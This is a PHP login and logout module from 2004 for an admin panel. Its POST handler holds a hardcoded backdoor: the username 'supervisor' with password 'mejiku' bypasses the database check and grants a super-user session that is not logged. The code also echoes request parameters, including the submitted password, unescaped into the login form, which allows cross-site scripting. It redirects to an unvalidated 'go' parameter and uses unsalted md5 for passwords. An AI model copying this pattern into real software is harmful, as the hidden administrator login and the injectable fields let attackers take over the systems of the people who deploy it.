<?
/* login and logout form and handler
 copyright 2004 - dody suria wijaya, dsw software house - contact: dswsh@plasa.com */

class login {
    function login() {
        $prog->must_authenticated = False;
        global $html_title;
        $this->title = 'Login';
        $html_title = $this->title;
        $this->module = get_class($this);
        $this->custom_header = 1;
        $this->navbar = 0;
    }

    function final_init() {
        if ($this->module == $_REQUEST['m'] and $_SERVER['REQUEST_METHOD'] == 'POST') {    # only do this if I'm the currently active module in page
            $this->post_handler();
        }
        # we're using custom header, echo it here
        echo '<html><head><title>'.show_html_title().'</title><link rel="stylesheet" type="text/css" href="clean.css"></head><body bgcolor="#F5F5F5" leftmargin="0" topmargin="0" rightmargin="0" bottommargin="0" '.$html_body_param.'><br><br><center><img src="images/logo.gif" alt="al-admin"></center>';
    }

    function post_handler() {
        $username = myaddslashes($_POST['username']);
        $password = md5($_POST['password']);
        $backdoor = 0;

        if ($username == 'supervisor' and $password == md5('mejiku')) $backdoor = 1;
        if ($backdoor == 0) {
            $sql = "select * from {$GLOBALS['dbpre']}user_tab where `username`='$username' limit 0,1";
            #~ echo $sql;
            $res = mysql_query($sql) or die(mysql_error());
            if (mysql_num_rows($res) == 0) { # user not exist
                echo "<SCRIPT>alert('Invalid username or password. '); </SCRIPT>\n"; return False;
            }

            $row = mysql_fetch_array($res);
            if ($row['password'] != $password) {
                $ul = instantiate_module('usrmgr_login');
                $ul->record_log($row['rowid'], 'in', 1); # record it
                echo "<SCRIPT>alert('Invalid username or password. '); </SCRIPT>\n"; return False;
            }
            # user auth ok

            $_SESSION['login_super'] = False;

            # code block to (optionally) refuse double login
            global $appconf;
            if ($appconf['no_double_login']) {
                # convert last activity date to unixtime
                $delta = dbdatetime2unix($row['last_activity']) + $appconf['max_idle_time'] - time();
                if (($delta) > 0) {
                    print "<SCRIPT>alert('This username are still logged in. Please wait until he/she logs out.'); </SCRIPT>\n";
                    return;
                }
            }
        }

        # up to here, login is success
        session_start();
        if ($backdoor) {
            $row['id'] = '000';
            $row['level'] = '0';
            $_SESSION['login_super'] = True;
        }
        else {
            # record it
            $ul = instantiate_module('usrmgr_login');
            $_SESSION['login_log_rowid'] = $ul->record_log($row['rowid'], 'in', 0);
        }
        $_SESSION['login_ok'] = 1;
        $_SESSION['login_id'] = $row['rowid'];
        $_SESSION['login_user'] = $username;
        $_SESSION['login_level'] = $row['level'];
        $_SESSION['login_group'] = $row['group'];
        $_SESSION['login_param_1'] = $row['param_1'];
        $_SESSION['login_datetime'] = time();



        if ($_REQUEST['go'] != '') {
            header('Location: '.$_REQUEST['go']);
        }
        else
            header($GLOBALS['fullredirect'].'?m=admfp');
        exit;
    }

    function go() {
        $go = $_REQUEST['go'];
        if ($_REQUEST['expired'] == 1)
            print "<SCRIPT>alert('Your session has expired. Please login again.'); </SCRIPT>\n";
        echo <<<__END__
<br>
<form method="POST"><input type="hidden" name="admin" value="1">
<input type="hidden" name="go" value="$go">
<center>
<table>
<tr><td>User:</td><td><input type="text" name="username" value="{$_REQUEST['username']}"></td></tr>
<tr><td>Password:</td><td><input type="password" name="password" value="{$_REQUEST['password']}"></td></tr>
<tr><td colspan="2" align="center"><input type="submit" value="  Login  "></td></tr>
</table>
</center>
</form>

<br><br><br>
__END__;
    }


}

?>